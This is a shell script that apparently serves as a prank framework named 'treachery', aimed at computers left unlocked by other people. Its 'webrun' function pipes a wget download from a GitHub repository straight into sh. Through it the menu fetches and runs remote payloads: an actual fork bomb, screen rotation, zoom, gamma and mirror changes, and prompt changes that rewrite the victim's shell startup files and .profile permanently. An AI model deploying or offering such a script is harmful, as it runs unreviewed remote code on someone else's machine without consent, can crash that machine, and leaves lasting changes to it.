#!/bin/sh
# dash uses . not source, so this checks if that needs to be remedied
if which source 2>/dev/null >/dev/null
then
	:;
else
	alias source="."
fi
# Function declarations
webrun(){ sh -c "$(wget -qO - $1)" ; }
split_screen(){ printf "\033(0"%"`tput cols`"s"\033(B\n" | tr ' ' 'q' ; }
# funny variables
BASEURL="https://raw.githubusercontent.com/BeerB34r/treachery/refs/heads/master"
B="\033[1m"
U="\033[4m"
N="\033[0m"
CHOICES="'list' 'help' '-h' 'shortlist' '-l' 'forked bom' 'forkbomb' 'gif' 'parrot' 'boykisser' 'prompt' 'brightness' 'rotate' 'flip' 'zoom'"
# Main program
echo -n 'Hello and welcome to this framework for treachery, built by the Goblin himself, for your execution pleasure. within you will find many "useful" options, available to you through just a few command-line arguments.'"\n\n"

treachery(){
# check if input is in the form of cmdline argument, if not do it interactively
	INPUT="$@"
	if [ ! -n "${INPUT}" ]
	then
		echo -n "Please provide your choice of treachery: "
		read INPUT
		split_screen
	fi
# the heart of the program, does all the heavy lifting
	case "${INPUT}" in
		"list"|"help"|"-h")
			echo "available options are as follows:
		'list'|'help'|'-h' displays this list
		'shortlist' displays all options without descriptions
		'forked bom' summons a bunch of forks in terminals
		'forkbomb' does an actual forkbomb, ${B}${U}do not use lightly${N}
		'gif' gives you the choice between several different ascii gifs to display in terminal
		'parrot' displays a disco parrot in the terminal
		'boykisser' sets the users prompt to Boykisser with the caption 'You like leaving your screen unlocked, dont you' (21 lines tall)
			NB! is permanent, as it changes all* shell startup scripts, as well as .profile
		'prompt' sets the users prompt to a much less intrusive version of the boykisser (1 line tall)
			NB! is permanent, as it changes all* shell startup scripts, as well as .profile
		'brightness' sets the gamma of the screen
		'rotate' rotates the screen by a factor
		'flip' rotates screen the 'regular' way
			IE: how you would rotate your monitor
		'zoom' zooms the screen in by a factor
		'mirror' reflects the screen
			"
			if [ ! "$@" = "" ]; then return; fi
			treachery
			;;
		"shortlist"|"-l")
			echo ${CHOICES}
			if [ ! "$@" = "" ]; then return; fi
			treachery
			;;
		"forked bom")
			echo "Forked bom chosen"
			webrun ${BASEURL}/assorted/forked_bom/deploy_fork_bom.sh
			;;
		"forkbomb")
			echo "Forkbomb chosen"
			webru ${BASEURL}/assorted/forkbomb.sh
			;;
		"gif")
			echo "Gif chosen"
			webrun ${BASEURL}/assorted/gif.sh
			;;
		"parrot")
			echo "Parrot chosen"
			webrun ${BASEURL}/assorted/parrot.sh
			;;
		"boykisser")
			echo "Boykisser chosen"
			webrun ${BASEURL}/assorted/you_like_leaving_your_screen_unlocked_dont_you.sh
			;;
		"prompt")
			echo "Prompt chosen"
			webrun ${BASEURL}/assorted/prompt.sh
			;;
		"brightness")
			echo "Brightness chosen"
			webrun ${BASEURL}/assorted/brightne.sh
			;;
		"rotate")
			echo "Rotate chosen"
			webrun ${BASEURL}/assorted/rotate.sh
			;;
		"flip")
			echo "Flip chosen"
			webrun ${BASEURL}/assorted/screen.sh
			;;
		"zoom")
			echo "Zoom chosen"
			webrun ${BASEURL}/assorted/zoom.sh
			;;
		"mirror")
			echo "Mirror chosen"
			webrun ${BASEURL}/assorted/mirror.sh
			;;
		*)
			if [ -n "${INPUT}" ]
			then
				echo "'${INPUT}' not found, see 'list' for all available options"
			else
				echo "No input detected, abandoning treachery"
				exit
			fi
			if [ ! "$@" = "" ]; then return; fi
			read -p "try again? [y/n]: " RETRY
			if [ ! "${RETRY}" = "n" ]
			then
				treachery 
			else
				echo "Treachery canceled"
			fi
			;;
	esac
}
treachery $@
